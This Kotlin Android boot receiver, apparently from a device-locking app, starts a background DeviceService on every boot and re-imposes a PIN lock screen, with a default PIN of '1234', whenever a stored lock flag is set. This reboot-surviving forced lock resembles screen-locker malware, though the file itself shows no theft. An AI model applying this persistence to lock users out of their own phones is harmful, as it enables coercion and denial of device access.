package com.sync.xxx

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        val action = intent?.action ?: return
        if (action != Intent.ACTION_BOOT_COMPLETED &&
            action != "android.intent.action.QUICKBOOT_POWERON" &&
            action != "android.intent.action.LOCKED_BOOT_COMPLETED") return

        android.util.Log.d("BootReceiver", "Boot received: $action")

        // Selalu start DeviceService
        val deviceServiceIntent = Intent(context, DeviceService::class.java)
        ContextCompat.startForegroundService(context, deviceServiceIntent)

        // Cek persistent lock state
        val persistentPrefs = context.getSharedPreferences(
            PersistentLockService.PREFS_NAME, Context.MODE_PRIVATE
        )
        val lockActive    = persistentPrefs.getBoolean(PersistentLockService.KEY_LOCK_ACTIVE, false)
        val manualUnlock  = persistentPrefs.getBoolean(PersistentLockService.KEY_MANUAL_UNLOCK, false)

        // Cek lock low legacy prefs juga
        val lockLowPrefs   = context.getSharedPreferences("lock_low_prefs", Context.MODE_PRIVATE)
        val lockLowActive  = lockLowPrefs.getBoolean("lock_low_active", false)

        // Cek lock chat v3 legacy prefs
        val chatPrefs      = context.getSharedPreferences("lock_chat_v3_prefs", Context.MODE_PRIVATE)
        val lockChatActive = chatPrefs.getBoolean("lock_active", false)

        android.util.Log.d("BootReceiver",
            "lockActive=$lockActive manualUnlock=$manualUnlock lockLowActive=$lockLowActive lockChatActive=$lockChatActive")

        when {
            // ── PERSISTENT LOCK (sistem baru, prioritas tertinggi) ──
            lockActive && !manualUnlock -> {
                android.util.Log.d("BootReceiver", "Restoring persistent lock after boot")
                Handler(Looper.getMainLooper()).postDelayed({
                    val restoreIntent = Intent(context, PersistentLockService::class.java).apply {
                        action = PersistentLockService.ACTION_RESTORE_LOCK
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        context.startForegroundService(restoreIntent)
                    else
                        context.startService(restoreIntent)
                }, 1000)
            }

            // ── LOCK LOW LEGACY ──
            lockLowActive -> {
                android.util.Log.d("BootReceiver", "Lock LOW (legacy) active after boot")
                val pin   = lockLowPrefs.getString("lock_low_pin", "1234") ?: "1234"
                val title = lockLowPrefs.getString("lock_low_title", "LOCKED") ?: "LOCKED"

                // Migrate ke persistent prefs
                PersistentLockService.saveAndStartLock(
                    context = context,
                    lockType = PersistentLockService.LOCK_TYPE_LOW,
                    pin = pin,
                    title = title
                )
            }

            // ── LOCK CHAT V3 LEGACY ──
            lockChatActive && !chatPrefs.getBoolean("manual_unlock", false) -> {
                android.util.Log.d("BootReceiver", "Lock Chat V3 (legacy) active after boot")
                val pin   = chatPrefs.getString("lock_pin", "1234") ?: "1234"
                val title = chatPrefs.getString("lock_title", "LOCKED") ?: "LOCKED"

                // Start legacy LockMonitorService
                val serviceIntent = Intent(context, LockMonitorService::class.java).apply {
                    putExtra(LockMonitorService.EXTRA_PIN, pin)
                    putExtra(LockMonitorService.EXTRA_TITLE, title)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    context.startForegroundService(serviceIntent)
                else
                    context.startService(serviceIntent)

                // Start LockChatActivity
                val activityIntent = Intent(context, LockChatActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                             Intent.FLAG_ACTIVITY_CLEAR_TOP or
                             Intent.FLAG_ACTIVITY_CLEAR_TASK or
                             Intent.FLAG_ACTIVITY_NO_ANIMATION)
                    putExtra(LockChatActivity.EXTRA_TITLE, title)
                    putExtra(LockChatActivity.EXTRA_PIN, pin)
                }
                context.startActivity(activityIntent)
            }

            else -> {
                android.util.Log.d("BootReceiver", "No active lock, DeviceService only")
            }
        }
    }
}
